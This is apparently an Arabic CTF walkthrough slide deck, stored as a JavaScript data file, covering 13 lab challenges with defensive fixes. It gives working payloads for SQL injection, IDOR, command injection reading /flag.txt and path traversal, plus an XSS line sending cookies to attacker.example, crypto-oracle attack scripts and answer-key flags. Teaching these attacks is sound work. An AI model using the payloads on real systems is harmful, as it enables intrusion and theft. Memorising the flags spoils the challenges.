// ═══════════════════════════════════════════════════════════════
//  CERT 95 — دليل الحلول (عرض شرائح يتبع قصة «عملية الأرشيف الصامت»)
//  كل شريحة: قصة → هدف → شرح الثغرة → أدوات كالي → خطوات بأوامر → فلاگ → إصلاح
//  الأوامر مكتوبة لمختبر يعمل على http://127.0.0.1:4000
// ═══════════════════════════════════════════════════════════════
window.DECK = [
  // ─────────── شريحة التمهيد ───────────
  {
    type: "intro",
    title: "عملية الأرشيف الصامت",
    sub: "تقرير فريق الاستجابة CERT 95 · القضية MR-024",
    body: `
      <p>الساعة 02:17. توقّف سجلّ أرشيف «مرصد» عن التحديث فجأة. لا باب مكسور، لا إنذار — فقط صمت. التدقيق الأولي كشف جملة واحدة في مذكّرة المناوب: «لم يُكسَر الباب؛ استُخدم مفتاح في المكان الخطأ».</p>
      <p>أنت محلل في <b>CERT 95</b>. مهمتك تتبّع أثر المخترق من بوابة الموقع العامة، خطوةً بخطوة، عبر 13 فصلاً مترابطاً، حتى تصل إلى خزنته الأخيرة وتغلق القضية.</p>
      <p>هذا الدليل يمشي معك <b>شريحة بشريحة</b>: في كل فصل سترى القصة، الهدف، شرح الثغرة، <b>أدوات كالي</b> التي ستستخدمها، <b>الأوامر</b> بالضبط، ثم الفلاگ. استعمله بعد محاولتك — القيمة في الطريق لا في الفلاگ.</p>
      <div class="intro-note">⚠️ كل التقنيات هنا للتعلّم داخل مختبرك المعزول فقط. لا توجّهها إلى أي نظام لا تملك إذناً خطّياً صريحاً باختباره.</div>
      <div class="intro-chain">
        <span>① الويب</span><i>→</i><span>② التشفير</span><i>→</i><span>③ الفورنسِك</span><i>→</i><span>④ الهندسة العكسية</span>
      </div>`,
  },

  // ═══════════ الويب ═══════════
  {
    n: 1, id: "web-sqli", domain: "web", title: "الباب المنسي", en: "SQL Injection", level: 2,
    story: "كل ما تملكه حساب «متدرّب». قبل أن تلاحق المخترق، ادخل كما دخل — من الباب الأمامي: نموذج تسجيل الدخول في بوابة مرصد.",
    objective: "تجاوز تسجيل الدخول واستخرج سرّ حساب <code>admin</code> دون معرفة كلمة مروره.",
    concept: "التطبيق يبني استعلام SQL بدمج مدخلك نصّياً: <code>...WHERE username='[مدخلك]'</code>. علامة اقتباس <code>'</code> تكسر الاستعلام، فتصبح أنت من يكتب منطق الشرط. الجذر: خلط الكود بالبيانات.",
    tools: [
      "المتصفح + أدوات المطوّر — أسرع اختبار يدوي",
      "<b>Burp Suite</b> — اعتراض الطلب وتعديله في Repeater",
      "<b>curl</b> — إرسال الحمولة من الطرفية",
      "<b>sqlmap</b> — الأتمتة والاستخراج الآلي",
    ],
    steps: [
      { t: "اكتشف الثغرة: أرسل علامة اقتباس في اسم المستخدم وراقب رسالة خطأ SQLite (error-based).",
        c: `curl "http://127.0.0.1:4000/web/login?username=admin%27&password=x"` },
      { t: "تجاوز الدخول بالتعليق — أنهِ قيمة الاسم وعلّق فحص كلمة المرور (في SQLite يحتاج <code>--</code> مسافة بعده). الحمولة: <code>admin'-- </code>",
        c: `curl "http://127.0.0.1:4000/web/login?username=admin%27--%20&password=x"` },
      { t: "أو شرط دائم الصحة يرجع أول صف (admin). الحمولة: <code>' OR 1=1-- </code>",
        c: `curl "http://127.0.0.1:4000/web/login?username=%27%20OR%201=1--%20&password=x"` },
      { t: "أو استخراج انتقائي بـ UNION (نفس عدد الأعمدة الأربعة): <code>' UNION SELECT 1,'x','admin',secret FROM users-- </code>",
        c: `# username = ' UNION SELECT 1,'x','admin',secret FROM users WHERE username='admin'-- ` },
      { t: "الطريق الآلي بـ sqlmap — يكتشف ويستخرج جدول المستخدمين كاملاً.",
        c: `sqlmap -u "http://127.0.0.1:4000/web/login?username=a&password=b" \\
       -p username --dbms=sqlite --batch --dump -T users` },
    ],
    flag: "ATHAR{sqli_un10n_l34ks_th3_4dm1n}",
    fix: "استعلامات معاملة (prepared statements): <code>db.prepare(\"...WHERE username=? AND password=?\").all(u,p)</code> + تخزين كلمات المرور كـ hash + إخفاء رسائل الخطأ.",
    transition: "دخلت بصلاحية admin. ملاحظاته تشير إلى «سجلّ تسليم داخلي» تحفظه خدمة الأرشيف خارج صلاحية المتدرّبين…",
  },
  {
    n: 2, id: "web-access", domain: "web", title: "مفتاح في المكان الخطأ", en: "Broken Access Control (IDOR + HPP)", level: 3,
    story: "ملاحظات admin تحدّثت عن سجلّ داخلي. خدمة الأرشيف تعرض الحسابات والتصدير — لكن صلاحيتها تُخدَع بترتيب المعاملات.",
    objective: "عدّد الحسابات للوصول إلى خدمة الأرشيف، ثم صدّر السجلّ الداخلي المحجوب <code>handover-internal</code>.",
    concept: "<b>IDOR</b>: قراءة كائن حسب مُعرّف يرسله المستخدم دون تحقق ملكية. <b>HPP</b> (تلوّث معاملات HTTP): إرسال المعامل مرتين، فتقرأ طبقة الفحص <i>أول</i> قيمة بينما يقرأ المنفّذ <i>آخر</i> قيمة — تناقض يتجاوز الفحص.",
    tools: [
      "المتصفح — لتعداد المعرّفات بسرعة",
      "<b>Burp Suite (Repeater)</b> — لإضافة معامل <code>record</code> مكرّر بسهولة",
      "<b>curl</b> — إرسال معاملات مكرّرة",
      "<b>ffuf</b> — لتعداد المعرّفات آلياً عند الحاجة",
    ],
    steps: [
      { t: "عدّد الحسابات بتغيير <code>id</code>؛ احصل على حساب خدمة الأرشيف (1337) الذي يكشف وجود التصدير والسجلات الداخلية.",
        c: `curl "http://127.0.0.1:4000/web/account?id=1001"
curl "http://127.0.0.1:4000/web/account?id=1337"` },
      { t: "جرّب تصدير السجلّ الداخلي مباشرة — سيُرفض (الفحص يقرأ أول قيمة).",
        c: `curl "http://127.0.0.1:4000/web/export?record=handover-internal"
# → 403 access denied` },
      { t: "لوّث المعامل: ضع المسموح أولاً (يمرّ الفحص) والداخلي أخيراً (يصدّره المنفّذ).",
        c: `curl "http://127.0.0.1:4000/web/export?record=public-brief&record=handover-internal"` },
      { t: "في Burp: افتح الطلب في Repeater وأضِف سطر <code>record</code> الثاني يدوياً في سلسلة الاستعلام." },
    ],
    flag: "ATHAR{1d0r_plus_h77p_p4r4m_p0llut10n}",
    fix: "تحقق تفويض لكل كائن (ownership)، وتوحيد معالجة المعاملات المكرّرة (ارفضها أو خذ قيمة واحدة في الفحص والتنفيذ معاً)، ومعرّفات غير متسلسلة.",
    transition: "السجلّ الداخلي يذكر جلسة محلّل نشطة على صفحة البحث — نقطة دخول إلى سياق المتصفح نفسه…",
  },
  {
    n: 3, id: "web-xss", domain: "web", title: "مرآة الإدخال", en: "Reflected XSS", level: 2,
    story: "صفحة البحث تعكس ما تكتبه كما هو. المحلّل الذي تتبّعه ترك رمز جلسته حيّاً في سياق تلك الصفحة.",
    objective: "نفّذ JavaScript في سياق صفحة البحث واقرأ رمز الجلسة (<code>window.__archive_token</code> أو الكوكي).",
    concept: "<b>XSS</b>: إدخال يُعاد إلى HTML دون ترميز فيُنفَّذ كسكربت في متصفح من يفتح الرابط. يُستغَل لسرقة الجلسات وتنفيذ إجراءات بالنيابة.",
    tools: [
      "المتصفح + أدوات المطوّر (Console) — لرؤية التنفيذ",
      "<b>Burp Suite</b> — صياغة الرابط وتجربة الحمولات",
      "<b>XSStrike</b> — فحص XSS آلي (اختياري)",
    ],
    steps: [
      { t: "اكتشف الانعكاس: أرسل وسماً بسيطاً وشاهد إن فُسِّر.",
        c: `http://127.0.0.1:4000/web/search?q=<b>test</b>` },
      { t: "نص النتائج سياق HTML خام، فالوسم <code>&lt;script&gt;</code> المنعكس يُنفَّذ عند التحميل. اقرأ رمز الجلسة:",
        c: `http://127.0.0.1:4000/web/search?q=<script>alert(window.__archive_token)</script>` },
      { t: "اقرأ الكوكي كذلك:",
        c: `?q=<script>alert(document.cookie)</script>` },
      { t: "سيناريو سرقة حقيقي (exfiltration) إلى خادم المهاجم:",
        c: `?q=<script>new Image().src='//attacker.example/?c='+document.cookie</script>` },
      { t: "جرّب النسخة المخزّنة (Stored) في دفتر الزوّار: انشر <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> فيضرب كل زائر لاحق." },
    ],
    flag: "ATHAR{r3fl3ct3d_x55_st34ls_th3_c00k13}",
    fix: "ترميز الإخراج حسب السياق + سياسة <code>Content-Security-Policy</code> + كوكيز <code>HttpOnly; Secure; SameSite</code>.",
    transition: "رمز الجلسة يفتح أداة داخلية لفحص الشبكة — وهي تبني أوامرها من مدخلك مباشرة…",
  },
  {
    n: 4, id: "web-cmdi", domain: "web", title: "خلف الأمر", en: "Command Injection", level: 3,
    story: "بالوصول الداخلي تبلغ أداة «فحص الشبكة». تنفّذ ping على المضيف الذي تعطيه — لكنها تمرّره إلى صدفة دون تنقية.",
    objective: "اقرأ الملف <code>/flag.txt</code> عبر حقن أمر في معامل المضيف.",
    concept: "<b>حقن الأوامر</b>: بناء سطر صدفة بدمج مدخلك يجعل رموزاً مثل <code>;</code> و<code>|</code> و<code>&amp;&amp;</code> و<code>$()</code> تُفسَّر كفواصل، فتُلحق أمرك. (الصدفة هنا محاكاة آمنة، لكن المنطق مطابق لـ RCE حقيقي.)",
    tools: [
      "<b>curl</b> — حقن الحمولة",
      "<b>Burp Suite</b> — تجربة فواصل الأوامر المختلفة",
    ],
    steps: [
      { t: "اختبر الحقن بأمر ثانٍ وشاهد إن نُفِّذ:",
        c: `curl "http://127.0.0.1:4000/web/netcheck?host=127.0.0.1%3Bid"` },
      { t: "استعرض الملفات المتاحة:",
        c: `curl "http://127.0.0.1:4000/web/netcheck?host=127.0.0.1%3Bls"` },
      { t: "اقرأ الفلاگ (<code>;</code> = ‎%3B، المسافة = ‎%20). الحمولة: <code>127.0.0.1;cat /flag.txt</code>",
        c: `curl "http://127.0.0.1:4000/web/netcheck?host=127.0.0.1%3Bcat%20/flag.txt"` },
      { t: "بدائل للفواصل — AND، أو استبدال أمر:",
        c: `?host=127.0.0.1%20%26%26%20cat%20/flag.txt      # &&
?host=%24(cat%20/flag.txt)                      # $()` },
    ],
    flag: "ATHAR{c0mm4nd_1nj3ct10n_ch41n3d}",
    fix: "لا تبنِ أوامر من مدخل — مرّر الوسائط كمصفوفة بلا shell: <code>execFile(\"ping\",[\"-c\",\"1\",host])</code>، مع allowlist صارم لصيغة المضيف.",
    transition: "مخرجات الأداة تكشف خدمة ملفات تبني مساراتها من اسم الملف الذي تطلبه…",
  },
  {
    n: 5, id: "web-traversal", domain: "web", title: "خارج الجذر", en: "Path Traversal", level: 2,
    story: "خدمة التنزيل تعطيك ملفات من مجلد «عام»، لكنها تلصق اسم الملف بالمسار دون منع الصعود — وبجواره مجلد «خاص».",
    objective: "اقرأ <code>flag.txt</code> من المجلد الخاص خارج المجلد العام.",
    concept: "<b>اجتياز المسار</b>: دمج اسم ملف من المستخدم بمسار أساس دون تحقق يسمح بـ <code>../</code> للصعود وقراءة ملفات حسّاسة.",
    tools: [
      "<b>curl</b> — طلب المسارات",
      "<b>Burp Suite</b> — تجربة صيغ الترميز (<code>%2e%2e%2f</code>)",
      "<b>ffuf / wfuzz</b> — تشويش أعماق الاجتياز آلياً",
    ],
    steps: [
      { t: "الطلب الطبيعي يعمل:",
        c: `curl "http://127.0.0.1:4000/web/files?name=notes.txt"` },
      { t: "اصعد مجلداً لرؤية المجلد الخاص:",
        c: `curl "http://127.0.0.1:4000/web/files?name=../private/config.txt"` },
      { t: "اقرأ الفلاگ:",
        c: `curl "http://127.0.0.1:4000/web/files?name=../private/flag.txt"` },
      { t: "الترميز يعمل أيضاً لتجاوز بعض الفلاتر:",
        c: `?name=%2e%2e%2fprivate%2fflag.txt` },
    ],
    flag: "ATHAR{d0t_d0t_sl4sh_3sc4p3d_th3_r00t}",
    fix: "حُلّ المسار النهائي وتأكّد أنه داخل الجذر المسموح (<code>resolve</code> + <code>startsWith</code>)، أو استخدم <code>basename</code> فقط، أو allowlist.",
    transition: "التهيئة الخاصة تشير إلى «لقطة وسائط خام» سُحبت أثناء الحادث. انتهى جزء الويب — يبدأ تحليل ما سرقه المخترق.",
  },

  // ═══════════ الفورنسِك + التشفير ═══════════
  {
    n: 6, id: "forensics-carve", domain: "forensics", title: "ذاكرة لا تُنسى", en: "File Carving", level: 2,
    story: "استرجعت اللقطة الخام. ليست نظام ملفات قابلاً للتركيب — لكن المخترق دفن فيها أرشيفاً (وآخر مُضلِّلاً).",
    objective: "انحت الأرشيف الصحيح من <code>capture.raw</code> واستخرج رمز الدليل بداخله.",
    concept: "<b>نحت الملفات</b>: استعادة ملفات من بيانات خام بالبحث عن تواقيع البداية (magic). توقيع ZIP هو <code>50 4B 03 04</code> (<code>PK\\x03\\x04</code>).",
    tools: [
      "<b>sha256sum</b> — تحقّق السلامة أولاً",
      "<b>binwalk</b> — كشف واستخراج الملفات المغروسة",
      "<b>foremost</b> — بديل للنحت حسب التواقيع",
      "<b>xxd / grep / unzip / base64</b> — النحت اليدوي والفكّ",
    ],
    steps: [
      { t: "تحقّق السلامة قبل أي شيء:",
        c: `sha256sum -c SHA256SUMS` },
      { t: "اكشف الملفات المغروسة — سترى أرشيفين (أحدهما «calibration/rejected» مُضلِّل):",
        c: `binwalk capture.raw` },
      { t: "استخرج تلقائياً، أو انحت يدوياً بإيجاد الإزاحات:",
        c: `binwalk -e capture.raw
# يدوياً:
grep -aboP '\\x50\\x4b\\x03\\x04' capture.raw` },
      { t: "افتح الأرشيف الحقيقي واقرأ <code>evidence/handover.txt</code> — فيه سطر Base64.",
        c: `unzip -o _capture.raw.extracted/*.zip
cat evidence/handover.txt` },
      { t: "فُكّ الـ Base64 مرة واحدة للحصول على الفلاگ:",
        c: `echo "QVRIQVJ7...}" | base64 -d` },
    ],
    flag: "ATHAR{f1l3_c4rv1ng_fr0m_4_r4w_dump}",
    fix: "(فورنسِك — لا إصلاح برمجي.) الدرس: التواقيع تفضح الملفات حتى بلا نظام ملفات؛ تحقّق السلامة دائماً قبل التحليل.",
    transition: "دليل التسليم يذكر رسائل اعتُرِضت من قناة ترحيل — بعضها بتشفير بسيط وبعضها أعقد…",
  },
  {
    n: 7, id: "crypto-xor", domain: "crypto", title: "المفتاح المتكرر", en: "Repeating-Key XOR", level: 1,
    story: "أول رسالة معترَضة: مذكرة إنجليزية مشفّرة بـ XOR بمفتاح قصير يتكرر. بداية سهلة قبل ما هو أصعب.",
    objective: "اكسر مفتاح XOR واستعِد النص؛ الفلاگ أحد أسطره.",
    concept: "<b>XOR بمفتاح متكرر</b>: المفتاح القصير يحوّله إلى عدة أصفار قيصرية — خمّن طول المفتاح (مسافة هامِنغ المطبّعة) ثم اكسر كل عمود بتحليل التردد.",
    tools: [
      "<b>xortool</b> — تخمين طول المفتاح وكسره آلياً",
      "<b>CyberChef</b> — «XOR Brute Force» بصرياً",
      "<b>python3</b> — سكربت الكسر اليدوي",
    ],
    steps: [
      { t: "حوّل hex إلى بايتات خام ثم مرّرها لـ xortool:",
        c: `xxd -r -p cipher.hex > cipher.bin
xortool -b -c ' ' cipher.bin` },
      { t: "إن عرفت الطول (هنا 6)، ثبّته:",
        c: `xortool -l 6 -c ' ' cipher.bin
cat xortool_out/filename-0.out` },
      { t: "أو سكربت Python (تخمين الطول + تحليل تردد لكل عمود):",
        c: `ct=bytes.fromhex(open('cipher.hex').read().split()[0])  # اجمع الأسطر
key=b'marsad'
pt=bytes(c^key[i%len(key)] for i,c in enumerate(ct))
print(pt.decode())` },
      { t: "المفتاح هو <code>marsad</code>. سطر «vault token» يحمل الفلاگ." },
    ],
    flag: "ATHAR{r3p3471ng_k3y_x0r_1s_n0t_s3cur3}",
    fix: "لا تستخدم XOR بمفتاح متكرر للسرية — AES-GCM بمفتاح عشوائي ونونس فريد.",
    transition: "المذكرة تشير إلى «قناة الترحيل relay-07» التي تحمل رسائل أثقل بتشفير AES…",
  },
  {
    n: 8, id: "crypto-ctr", domain: "crypto", title: "الصدى المزدوج", en: "CTR Nonce Reuse", level: 3,
    story: "من قناة relay-07 التُقِط إطاران مشفّران بـ AES-256-CTR — بنفس المفتاح ونفس العدّاد. ولديك نصّ أحدهما المعروف.",
    objective: "استعد رسالة التسليم (handover) واستخرج الرمز بداخلها.",
    concept: "CTR يشفّر بـ <code>C = P ⊕ S</code>. إعادة الزوج (مفتاح، عدّاد) يعطي نفس تيار S لرسالتين ⇒ <b>two-time pad</b>: <code>P2 = C1 ⊕ C2 ⊕ P1</code>.",
    tools: [
      "<b>python3</b> — حساب XOR بين الإطارين والنص المعروف",
      "<b>CyberChef</b> — عمليات XOR وFrom Hex بصرياً",
    ],
    steps: [
      { t: "لاحظ تطابق <code>key_id</code> و<code>counter</code> في الإطارين داخل <code>channel.json</code> — هذا هو العطب.",
        c: `cat channel.json` },
      { t: "النص المعروف P1 هو قالب heartbeat (192 بايت) بين <code>---BEGIN---</code> و<code>---END---</code> في <code>protocol.txt</code>." },
      { t: "احسب <code>P2 = C1 ⊕ C2 ⊕ P1</code> بـ Python:",
        c: `import json
ch=json.load(open('channel.json'))
c1=bytes.fromhex(ch['frames'][0]['ciphertext'])
c2=bytes.fromhex(ch['frames'][1]['ciphertext'])
p1=open('protocol.txt').read().split('---BEGIN---\\n')[1].split('\\n---END---')[0].encode()
print(bytes(a^b^c for a,b,c in zip(c1,c2,p1)).decode('latin1'))` },
      { t: "الناتج يحوي <code>vault_token</code> = الفلاگ." },
    ],
    flag: "ATHAR{ctr_n0nc3_r3us3_1s_4_tw0_71m3_p4d}",
    fix: "نونس فريد لكل رسالة، ويُفضَّل AES-GCM (تشفير مصادَق).",
    transition: "رسالة التسليم تذكر «خدمة تهيئة» تردّ مشفّرة بوضع ECB — تسريب بنيوي بانتظارك…",
  },
  {
    n: 9, id: "crypto-ecb", domain: "crypto", title: "بايت تلو الآخر", en: "ECB Oracle", level: 3,
    story: "خدمة التهيئة حيّة: تشفّر (مدخلك + سرّ ثابت) بوضع ECB وتعيد الناتج. هذا كل ما تحتاجه لتسريب السرّ.",
    objective: "استعد السرّ الكامل من الـ oracle على <code>/web/ecb</code>.",
    concept: "<b>ECB</b> يشفّر كل كتلة 16 بايت باستقلال (نفس الدخل ⇒ نفس الخرج). تحاذي السرّ ليبقى بايت مجهول آخر كتلة ثم تجرّب 256 قيمة — بايتاً بايتاً (cryptopals #12).",
    tools: [
      "<b>python3 + requests</b> — سكربت الاستخراج الآلي",
      "<b>curl</b> — فحص الـ oracle يدوياً",
    ],
    steps: [
      { t: "اكتشف أنه ECB: أرسل 32 بايت متطابقة؛ إن تطابقت أول كتلتين (16 بايت) في الناتج ⇒ ECB.",
        c: `curl "http://127.0.0.1:4000/web/ecb?text=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"` },
      { t: "شغّل سكربت الاستخراج بايتاً بايتاً:",
        c: `import requests
B="http://127.0.0.1:4000"; BS=16
def oracle(b): return bytes.fromhex(requests.get(f"{B}/web/ecb",params={"hex":b.hex()}).json()["ciphertext"])
out=b""
for i in range(len(oracle(b""))):
    blk=i//BS; pad=b"A"*(BS-1-i%BS)
    want=oracle(pad)[blk*BS:blk*BS+BS]
    for g in range(256):
        if oracle(pad+out+bytes([g]))[blk*BS:blk*BS+BS]==want:
            out+=bytes([g]); break
    else: break
print(out.rstrip(b"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x0a\\x0b\\x0c\\x0d\\x0e\\x0f\\x10").decode())` },
      { t: "السكربت يطبع السرّ كاملاً = الفلاگ." },
    ],
    flag: "ATHAR{byt3_47_4_71m3_3cb_0r4cl3_pwn}",
    fix: "لا ECB أبداً — AES-GCM بنونس فريد، ولا تدمج مدخل المستخدم مع سرّ قبل تشفير يسرّب أنماط الكتل.",
    transition: "السرّ المستخرَج اعتمادٌ لأدوات المخترق. سجّل دخوله محفوظ في التقاط شبكة…",
  },
  {
    n: 10, id: "forensics-pcap", domain: "forensics", title: "همس الشبكة", en: "PCAP Credentials", level: 2,
    story: "التقاط شبكة يوثّق لحظة تسجيل المخترق دخوله إلى بوابته — عبر HTTP نصّي بلا TLS.",
    objective: "استخرج كلمة المرور المُرسَلة من <code>capture.pcap</code>.",
    concept: "بروتوكولات النص الصريح (HTTP/FTP/Telnet) تكشف كل شيء لمن يتنصّت. يكفي متابعة محادثة TCP لقراءة الاعتماد.",
    tools: [
      "<b>Wireshark</b> — Follow TCP Stream بصرياً",
      "<b>tshark</b> — الاستخراج من الطرفية",
      "<b>strings / grep</b> — أسرع طريق",
      "<b>NetworkMiner</b> — استخراج الاعتمادات آلياً",
    ],
    steps: [
      { t: "أسرع طريق — فتّش النص الصريح مباشرة:",
        c: `strings capture.pcap | grep -i "password"` },
      { t: "بـ tshark — استخرج جسم طلب POST:",
        c: `tshark -r capture.pcap -Y "http.request.method==POST" \\
       -T fields -e http.file_data` },
      { t: "بـ Wireshark: انقر يميناً على أي حزمة → Follow → TCP Stream، واقرأ <code>POST /api/login</code> وجسمه <code>username=...&password=...</code>." },
    ],
    flag: "ATHAR{cr3d3n714ls_l34k3d_1n_7h3_pc4p}",
    fix: "TLS دائماً، ولا ترسل أسراراً في طلب غير مشفّر.",
    transition: "باعتماد البوابة تصل إلى صورة رفعها المخترق — تبدو عادية لكنها تخفي شيئاً…",
  },
  {
    n: 11, id: "forensics-stego", domain: "forensics", title: "الصورة الصامتة", en: "LSB Steganography", level: 2,
    story: "الصورة <code>cover.png</code> مجرد تدرّج لوني ظاهرياً. المخترق خبّأ فيها موقع وحدته الأخيرة.",
    objective: "استخرج الرسالة المخبّأة في أقل بت (LSB) من بكسلات الصورة.",
    concept: "<b>إخفاء LSB</b>: تعديل أقل بت في كل قناة لون يحمل بتات الرسالة دون أثر مرئي. هنا: ترتيب R,G,B صفّياً، أول 32 بت = طول الرسالة ثم بايتاتها.",
    tools: [
      "<b>zsteg</b> — يفحص خطط LSB الشائعة تلقائياً",
      "<b>stegsolve</b> — تصفّح مستويات البتات بصرياً",
      "<b>exiftool / binwalk</b> — بيانات وصفية وبيانات ملحقة",
      "<b>python3 + Pillow</b> — الاستخراج الدقيق",
    ],
    steps: [
      { t: "جرّب الأدوات الآلية أولاً:",
        c: `zsteg -a cover.png
exiftool cover.png` },
      { t: "الاستخراج الدقيق بـ Python (طول 32-بت ثم البايتات):",
        c: `from PIL import Image
px=list(Image.open('cover.png').convert('RGB').getdata())
bits=[v&1 for p in px for v in p]
n=int(''.join(map(str,bits[:32])),2)
msg=bytes(int(''.join(map(str,bits[32+i*8:40+i*8])),2) for i in range(n))
print(msg.decode())` },
      { t: "الناتج هو الفلاگ." },
    ],
    flag: "ATHAR{lsb_s73g0_h1dd3n_1n_pl41n_p1x3ls}",
    fix: "(فورنسِك — لا إصلاح برمجي.) الدرس: البيانات المخفية في LSB غير مرئية لكنها حتمية الاستخراج بمعرفة الخطة.",
    transition: "الرسالة تكشف أداة ترخيص مموّهة تحرس المرحلة الأخيرة…",
  },

  // ═══════════ الهندسة العكسية ═══════════
  {
    n: 12, id: "rev-js", domain: "reverse", title: "المفتاح المموَّه", en: "Obfuscated JS Keygen", level: 2,
    story: "أداة المخترق فيها مُتحقِّق ترخيص بـ JavaScript مموّه. المفتاح الصحيح الذي يقبله هو ما تبحث عنه.",
    objective: "فكّ تمويه <code>licence.js</code> واعكس التحويل لاستعادة المفتاح.",
    concept: "<b>تمويه JS</b> (مصفوفات سلاسل، أسماء مشفّرة، ثوابت hex) يرفع التكلفة فقط لا الأمان — المنطق كله أمامك. اقرأ التحويل واعكسه.",
    tools: [
      "<b>js-beautify</b> — إعادة تنسيق الكود",
      "<b>node</b> — تشغيل والتحقق",
      "<b>أدوات المطوّر / de4js</b> — فكّ التمويه",
      "<b>CyberChef</b> — عمليات XOR/From Hex",
    ],
    steps: [
      { t: "جمّل الكود واقرأ المنطق:",
        c: `js-beautify licence.js | less` },
      { t: "ستجد: <code>_t</code> سلسلة hex لجدول الهدف، و<code>_v</code> يطبّق على كل حرف: <code>c=((code+i*7)^0x5a)&0xff</code> ثم <code>ROL1</code>." },
      { t: "اعكس التحويل: <code>ROR1</code> ثم <code>^0x5a</code> ثم اطرح <code>i*7</code> — انسخ قيمة <code>_t</code> هنا:",
        c: `t=bytes.fromhex("<targetHex>")
print(''.join(chr(((((b>>1)|((b&1)<<7))^0x5a)-i*7)&0xff) for i,b in enumerate(t)))` },
      { t: "تحقّق بتشغيل المشغّل:",
        c: `node run.mjs "ATHAR{...}"   # → VALID LICENCE ✓` },
    ],
    flag: "ATHAR{d30bfusc473d_7h3_l1c3ns3_k3yg3n}",
    fix: "التمويه ليس أماناً — التحقق الحسّاس يكون في الخادم لا في كود يصل للمستخدم.",
    transition: "بالمفتاح بيدك تبقى بوابة واحدة: وحدة WebAssembly تحرس الخزنة…",
  },
  {
    n: 13, id: "rev-wasm", domain: "reverse", title: "خلف التعليمات", en: "WebAssembly Validator", level: 3,
    story: "البوابة الأخيرة: وحدة <code>verifier.wasm</code> تقبل سلسلة واحدة فقط — التصريح الذي يفتح الخزنة.",
    objective: "اعكس التحويل والجدول في الوحدة لإنتاج السلسلة المقبولة.",
    concept: "<b>عكس WebAssembly</b>: الوحدة ليست صندوقاً أسود — حوّلها لنص واقرأ المنطق: فحص طول، قراءة الدخل من الذاكرة، تحويل لكل بايت، ومقارنة بجدول في الذاكرة عند إزاحة 1024.",
    tools: [
      "<b>WABT</b>: <code>wasm2wat</code> و<code>wasm-decompile</code> — قراءة المنطق",
      "<b>node</b> — تشغيل الوحدة وقراءة الذاكرة والتحقق",
      "<b>Ghidra</b> (مع إضافة wasm) — تحليل أعمق اختياري",
    ],
    steps: [
      { t: "حوّل الوحدة إلى نص واقرأ المنطق:",
        c: `wasm2wat verifier.wasm -o verifier.wat
wasm-decompile verifier.wasm -o verifier.dcmp` },
      { t: "التحويل لكل i: <code>x=((v[i]^saltByte(i))+i*17)&255</code>، <code>t=ROL3(x)^prev</code>، يُخزَّن في <code>table[(i*5)%n]</code>، و<code>prev</code> يبدأ <code>0x5a</code>. و<code>salt=0x9e3779b1</code> (من README)." },
      { t: "اقرأ الجدول من الذاكرة (إزاحة 1024) واعكس، وجرّب الأطوال محقّقاً عبر <code>validate</code>:",
        c: `node -e '
const SALT=0x9e3779b1;
const fs=require("fs");
(async()=>{
 const {instance}=await WebAssembly.instantiate(fs.readFileSync("verifier.wasm"),
   {env:{salt:new WebAssembly.Global({value:"i32",mutable:false},SALT|0)}});
 const m=new Uint8Array(instance.exports.memory.buffer);
 const sB=i=>(SALT>>>((i%4)*8))&255, ror3=v=>((v>>>3)|(v<<5))&255;
 for(let n=20;n<=64;n++){let o=Buffer.alloc(n),prev=0x5a;
  for(let i=0;i<n;i++){let v=m[1024+(i*5)%n];o[i]=((ror3(v^prev)-i*17)&255)^sB(i);prev=v;}
  m.fill(0,0,600);m.set(o,0);
  if(instance.exports.validate(0,n)===1){console.log(o.toString());break;}}
})();'` },
      { t: "الناتج هو الفلاگ — التصريح الذي يفتح الخزنة." },
    ],
    flag: "ATHAR{w3b4ss3mbly_r3v3rs3d_w17h0u7_7h3_ui}",
    fix: "لا تضع أسراراً أو تحققاً حسّاساً في الـ client بأي صيغة — WebAssembly قابل للعكس بالكامل.",
    transition: "الخزنة فُتحت. عملية الأرشيف الصامت أُغلقت — من الباب الأمامي إلى آخر بوابة.",
  },

  // ─────────── شريحة النهاية ───────────
  {
    type: "finale",
    title: "اكتملت العملية 🏁",
    sub: "القضية MR-024 — مغلقة",
    body: `
      <p>تتبّعت الأثر من الألف إلى الياء: من حقن في نموذج دخول، عبر كسر صلاحيات وتشفير أُسيء استخدامه، إلى عكس وحدة تحرس الخزنة. أغلقت الفصول الثلاثة عشر جميعاً.</p>
      <p><b>ما تعلّمته:</b> الثغرات نادراً ما تكون معزولة — كل خطأ يفتح الباب للذي يليه. والدفاع يبدأ من الجذر نفسه: لا تخلط الكود بالبيانات، لا تثق بالمدخل، ولا تضع السرّ حيث يصله الخصم.</p>
      <p class="finale-sign">— فريق الاستجابة CERT 95</p>`,
  },
];
